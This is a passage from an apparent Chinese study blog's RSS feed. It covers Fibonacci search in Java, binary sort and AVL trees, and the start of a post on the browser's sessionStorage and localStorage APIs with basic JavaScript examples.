&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] f = fibonacci();
 
		&lt;span style=&#34;color:#228b22&#34;&gt;// 获取斐波那契分割数值下标
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (data.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt; &amp;gt; f[k] - 1) {
			k++;
		}
 
 		&lt;span style=&#34;color:#228b22&#34;&gt;// 利用Java工具类Arrays 构造新数组并指向 数组 a[]
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] temp=Arrays.&lt;span style=&#34;color:#658b00&#34;&gt;copyOf&lt;/span&gt;(a, f[k]);
 
		&lt;span style=&#34;color:#228b22&#34;&gt;// 序列补充至f[k]个元素
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#228b22&#34;&gt;// 补充的元素值为最后一个元素的值
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = data.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt;; i &amp;lt; f[k] - 1; i++) {
			temp[i] = temp[high];
		}
 
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (low &amp;lt;= high) {
			&lt;span style=&#34;color:#228b22&#34;&gt;// low：起始位置
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#228b22&#34;&gt;// 前半部分有f[k-1]个元素，由于下标从0开始
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#228b22&#34;&gt;// 则-1 获取 黄金分割位置元素的下标
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;			mid = low + f[k - 1] - 1;
 
			&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (temp[mid] &amp;gt; key) {
				&lt;span style=&#34;color:#228b22&#34;&gt;// 查找前半部分，高位指针移动
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				high = mid - 1;
				&lt;span style=&#34;color:#228b22&#34;&gt;// （全部元素） = （前半部分）+（后半部分）
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#228b22&#34;&gt;// f[k] = f[k-1] + f[k-1]
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#228b22&#34;&gt;// 因为前半部分有f[k-1]个元素，所以 k = k-1
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				k = k - 1;
			} &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (temp[mid] &amp;lt; key) {
				&lt;span style=&#34;color:#228b22&#34;&gt;// 查找后半部分，高位指针移动
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				low = mid + 1;
				&lt;span style=&#34;color:#228b22&#34;&gt;// （全部元素） = （前半部分）+（后半部分）
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#228b22&#34;&gt;// f[k] = f[k-1] + f[k-1]
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#228b22&#34;&gt;// 因为后半部分有f[k-1]个元素，所以 k = k-2
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				k = k - 2;
			} &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
				&lt;span style=&#34;color:#228b22&#34;&gt;// 如果为真则找到相应的位置
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;				&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (mid &amp;lt;= high) {
					&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; mid;
				} &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
					&lt;span style=&#34;color:#228b22&#34;&gt;// 出现这种情况是查找到补充的元素
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;					&lt;span style=&#34;color:#228b22&#34;&gt;// 而补充的元素与high位置的元素一样
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;					&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; high;
				}
			}
		}
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; -1;
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;算法复杂度分析&#34;&gt;算法复杂度分析&lt;/h3&gt;
&lt;p&gt;算法复杂度 O(logn)&lt;/p&gt;
&lt;p&gt;平均性能要优于折半查找，如果是最坏情况比如如本例程序中 key=1,那么始终在左侧长半区查找，则查找效率要低于折半查找。&lt;/p&gt;
&lt;p&gt;二分查找分割方式 mid = (low+high)/2&lt;/p&gt;
&lt;p&gt;插值查找分割方式 mid = low + (high-low)*(key-a[low])/(a[high]-a[low])&lt;/p&gt;
&lt;p&gt;斐波那契查找分割方式 mid = low + Fibonacci[index - 1] - 1&lt;/p&gt;
&lt;p&gt;海量数据查找中，这种细微的差距会影响最终的查找效率。&lt;/p&gt;
&lt;h1 id=&#34;动态查找表dynamic-search-table&#34;&gt;动态查找表(Dynamic Search Table)&lt;/h1&gt;
&lt;p&gt;当查找表以顺序存储结构存储且需要保持有序时，若对查找表进行插入、删除或排序操作，就必须移动大量的记录，当记录数很多时，这种移动的代价很大。若查找表无序，则插入删除可无需移动大量记录，但于查找不利。利用树的形式组织查找表，可以对查找表进行动态高效的查找。&lt;/p&gt;
&lt;p&gt;在查找过程中同时插入查找表中不存在的数据元素, 或者从查找表中删除已经存在的某个数据元素。显然动态查找表的操作就是2个动作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查找时插入数据元素&lt;/li&gt;
&lt;li&gt;查找时删除数据元素&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;动态查找表主要使用树形结构中的二叉排序树（Binary Sort Tree）、平衡二叉树（Balance Binary Tree或AVL Tree, Adelson-Velskii Landis Tree），&lt;strong&gt;AVL与BST均在961考纲中&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;二叉排序树&#34;&gt;二叉排序树&lt;/h2&gt;
&lt;p&gt;二叉排序树(Binary Sort Tree或Binary Search Tree) 的定义为：二叉排序树或者是空树，或者是满足下列性质的二叉树：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;若左子树不为空，则左子树上所有结点的值(关键字)都小于根结点的值；&lt;/li&gt;
&lt;li&gt;若右子树不为空，则右子树上所有结点的值(关键字)都大于根结点的值；&lt;/li&gt;
&lt;li&gt;左、右子树都分别是二叉排序树。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;若按中序遍历一棵二叉排序树，所得到的结点序列是一个递增序列。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;二叉排序树性能&#34;&gt;二叉排序树性能&lt;/h3&gt;
&lt;p&gt;二叉排序树查找关键字的比较次数，等于该结点所在的层次数（查找成功）； 若查找不成功，其比较次数最多为树的深度。对于一棵具有n个结点的树来说，其深度介于㏒&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;(n+1)与n之间。二叉排序树的形态对于查找效率至关重要，或者说，一棵二叉排序树不一定就能提高查找的速度，而是要看这棵树的形态。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;指导书中二叉排序树与二分查找的对比&lt;/strong&gt;：就维护表的&lt;strong&gt;有序性&lt;/strong&gt;而言，二叉排序树无需移动结点，只需修改指针即可完成插入和删除操作，平均执行时间为O(log&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;n)。二分查找的对象是&lt;strong&gt;有序顺序表&lt;/strong&gt;，若有插入和删除结点的操作，所花时间是O(n)。当有序表是&lt;strong&gt;静态查找表&lt;/strong&gt;时，宜用&lt;strong&gt;顺序表&lt;/strong&gt;作为其&lt;strong&gt;存储结构&lt;/strong&gt;，而采用二分查找实现其查找操作；若有序表是动态查找表，则应该选择二叉排序树作为其逻辑结构。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;平衡二叉树&#34;&gt;平衡二叉树&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;为了避免树的高度增长过快，降低二叉排序的性能&lt;/strong&gt;，规定在插入和删除二叉树结点时，要保证任意结点的左、右树高度差的绝对值&lt;strong&gt;不超过1&lt;/strong&gt;，这样的二叉树称为平衡二叉树，简称平衡树。定义结点左子树和右子树的高度差为该节点的&lt;strong&gt;平衡因子&lt;/strong&gt;。平衡二叉树结点的平衡因子只可能是&lt;code&gt;-1&lt;/code&gt;、&lt;code&gt;0&lt;/code&gt;或&lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;平衡二叉树的插入过程的前半部分与二叉排序树相同，但是在新节点插入后，若造成查找路径上的某个结点不再平衡，则需要作出相应的调整。归纳总结为以下四种情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LL平衡旋转（右单旋转）&lt;/li&gt;
&lt;li&gt;RR平衡旋转（左单旋转）&lt;/li&gt;
&lt;li&gt;LR平衡旋转（先左后右双旋转）&lt;/li&gt;
&lt;li&gt;RL平衡旋转（先右后左双旋转）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;平衡二叉树性能&#34;&gt;平衡二叉树性能&lt;/h3&gt;
&lt;p&gt;含有n个结点的平衡二叉树最大深度为O(log&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;n)，因此平衡二叉树的平均查找长度为O(log&lt;!-- raw HTML omitted --&gt;2&lt;!-- raw HTML omitted --&gt;n)。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://juejin.im/entry/5b6a89916fb9a04f86065737&#34;&gt;https://juejin.im/entry/5b6a89916fb9a04f86065737&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000022654107&#34;&gt;数据结构与算法之查找（静态查找与动态查找）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/fibonacci-search/&#34;&gt;Fibonacci Search on GeeksforGeeks&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
- https://www.openheart.icu/cs/%E5%8A%A8%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%8E%E9%9D%99%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>SessionStorage &amp; LocalStorage &amp; Cookie</title>
        <link>https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/</link>
        <pubDate>Sat, 25 Jul 2020 11:42:23 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/</guid>
        <description>42th openheart https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/ -&lt;h1 id=&#34;windowsessionstorage&#34;&gt;Window.sessionStorage&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sessionStorage&lt;/code&gt; 属性允许你访问一个，对应当前源的 session &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。它与 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;&lt;code&gt;localStorage&lt;/code&gt;&lt;/a&gt; 相似，不同之处在于 &lt;code&gt;localStorage&lt;/code&gt; 里面存储的数据没有过期时间设置，而存储在 &lt;code&gt;sessionStorage&lt;/code&gt; 里面的数据在页面会话结束时会被清除。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文&lt;/strong&gt;，这点和 session cookies 的运行方式不同。&lt;/li&gt;
&lt;li&gt;打开多个相同的URL的Tabs页面，会创建各自的&lt;code&gt;sessionStorage&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;关闭对应浏览器tab，会清除对应的&lt;code&gt;sessionStorage&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;应该注意，存储在sessionStorage或localStorage中的数据&lt;strong&gt;特定于页面的协议&lt;/strong&gt;。也就是说&lt;code&gt;http://example.com&lt;/code&gt; 与 &lt;code&gt;https://example.com&lt;/code&gt;的sessionStorage相互隔离。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 保存数据到 sessionStorage
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 获取数据
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; data = sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 删除保存的数据
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.removeItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;key&amp;#39;&lt;/span&gt;);

&lt;span style=&#34;color:#228b22&#34;&gt;// 从 sessionStorage 删除所有保存的数据
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;sessionStorage.clear();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;返回值&#34;&gt;返回值&lt;/h3&gt;
&lt;p&gt;一个 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;p&gt;下面的代码访问当前域名的 session &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，并使用 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 访问往里面添加一个数据条目。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Tom&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面的示例会自动保存一个文本输入框的内容，如果浏览器因偶然因素被刷新了，文本输入框里面的内容会被恢复，因此写入的内容不会丢失。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 获取文本输入框
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; field = &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.getElementById(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;field&amp;#34;&lt;/span&gt;);
 
&lt;span style=&#34;color:#228b22&#34;&gt;// 检测是否存在 autosave 键值
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// (这个会在页面偶然被刷新的情况下存在)
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;)) {
  &lt;span style=&#34;color:#228b22&#34;&gt;// 恢复文本输入框的内容
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  field.value = sessionStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;);
}
 
&lt;span style=&#34;color:#228b22&#34;&gt;// 监听文本输入框的 change 事件
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;field.addEventListener(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;change&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt;() {
  &lt;span style=&#34;color:#228b22&#34;&gt;// 保存结果到 sessionStorage 对象中
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;  sessionStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;autosave&amp;#34;&lt;/span&gt;, field.value);
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;windowlocalstorage&#34;&gt;Window.localStorage&lt;/h1&gt;
&lt;p&gt;只读的&lt;code&gt;localStorage&lt;/code&gt; 属性允许你访问一个&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Document&#34;&gt;&lt;code&gt;Document&lt;/code&gt;&lt;/a&gt; 源（origin）的对象 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt;；存储的数据将保存在浏览器会话中。&lt;code&gt;localStorage&lt;/code&gt; 类似 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;&lt;code&gt;sessionStorage&lt;/code&gt;&lt;/a&gt;，但其区别在于：存储在 &lt;code&gt;localStorage&lt;/code&gt; 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 &lt;code&gt;sessionStorage&lt;/code&gt; 的数据会被清除 。&lt;/p&gt;
&lt;p&gt;应注意，无论数据存储在 &lt;code&gt;localStorage&lt;/code&gt; 还是 &lt;code&gt;sessionStorage&lt;/code&gt; ，&lt;strong&gt;它们都特定于页面的协议。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;另外，&lt;code&gt;localStorage&lt;/code&gt; 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).&lt;/p&gt;
&lt;h2 id=&#34;语法-1&#34;&gt;语法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;myStorage = localStorage;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;值&#34;&gt;值&lt;/h3&gt;
&lt;p&gt;一个可被用于访问当前源（ origin ）的本地存储空间的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。&lt;/p&gt;
&lt;h3 id=&#34;异常&#34;&gt;异常&lt;/h3&gt;
&lt;h4 id=&#34;securityerror&#34;&gt;SecurityError&lt;/h4&gt;
&lt;p&gt;请求违反了一个策略声明，或者源（ origin ）不是 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Definition_of_an_origin&#34;&gt;一个有效的 scheme/host/port tuple&lt;/a&gt; （例如如果origin使用 &lt;code&gt;file:&lt;/code&gt; 或者 &lt;code&gt;data:&lt;/code&gt; 形式将可能发生）。比如，用户可以有禁用允许对指定的origin存留数据的浏览器配置。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;TODO：没大弄明白&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;示例-1&#34;&gt;示例&lt;/h3&gt;
&lt;p&gt;下面的代码片段访问了当前域名下的本地 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，并通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 增加了一个数据项目。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;Tom&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于读取 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;let&lt;/span&gt; cat = localStorage.getItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于移除 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.removeItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;myCat&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该语法用于移除所有的 &lt;code&gt;localStorage&lt;/code&gt; 项，如下:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// 移除所有
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;localStorage.clear();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;使用-web-storage-api&#34;&gt;使用 Web Storage API&lt;/h1&gt;
&lt;p&gt;Web Storage API 提供了存储机制，通过该机制，浏览器可以安全地存储键值对，比使用 cookie 更加直观&lt;/p&gt;
&lt;h2 id=&#34;基本概念&#34;&gt;基本概念&lt;/h2&gt;
&lt;p&gt;存储对象是简单的键值存储，类似于对象，但是它们在页面加载时保持完整。键和值始终是字符串（请注意，与对象一样，整数键将自动转换为字符串）。您可以像访问对象一样访问这些值，或者使用  &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/getItem&#34;&gt;&lt;code&gt;Storage.getItem()&lt;/code&gt;&lt;/a&gt; 和  &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage/setItem&#34;&gt;&lt;code&gt;Storage.setItem()&lt;/code&gt;&lt;/a&gt; 方法 。这三行都设置了（相同的）colorSetting条目：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;localStorage.colorSetting = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;;
localStorage[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;colorSetting&amp;#39;&lt;/span&gt;] = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;;
localStorage.setItem(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;colorSetting&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;#a4509b&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Web Storage 包含如下两种机制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sessionStorage&lt;/code&gt; 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;localStorage&lt;/code&gt; 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这两种机制是通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;&lt;code&gt;Window.sessionStorage&lt;/code&gt;&lt;/a&gt; 和 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;&lt;code&gt;Window.localStorage&lt;/code&gt;&lt;/a&gt; 属性使用（更确切的说，在支持的浏览器中 &lt;code&gt;Window&lt;/code&gt; 对象实现了 &lt;code&gt;WindowLocalStorage&lt;/code&gt;和 &lt;code&gt;WindowSessionStorage&lt;/code&gt; 对象并挂在其 &lt;code&gt;localStorage&lt;/code&gt; 和 &lt;code&gt;sessionStorage&lt;/code&gt; 属性下）—— 调用其中任一对象会创建 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，通过 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象，可以设置、获取和移除数据项。对于每个源（origin）&lt;code&gt;sessionStorage&lt;/code&gt; 和 &lt;code&gt;localStorage&lt;/code&gt; 使用不同的 Storage 对象——独立运行和控制。&lt;/p&gt;
&lt;p&gt;例如，在文档中调用 &lt;code&gt;localStorage&lt;/code&gt; 将会返回一个 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象；调用 &lt;code&gt;sessionStorage&lt;/code&gt; 返回一个不同的 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Storage&#34;&gt;&lt;code&gt;Storage&lt;/code&gt;&lt;/a&gt; 对象。可以使用相同的方式操作这些对象，但是操作是独立的。&lt;/p&gt;
&lt;h2 id=&#34;localstorage-功能检测&#34;&gt;localStorage 功能检测&lt;/h2&gt;
&lt;p&gt;为了能够使用 localStorage，我们应该首先验证它是否在当前浏览会话中受支持并可用。&lt;/p&gt;
&lt;h3 id=&#34;测试可用性&#34;&gt;测试可用性&lt;/h3&gt;
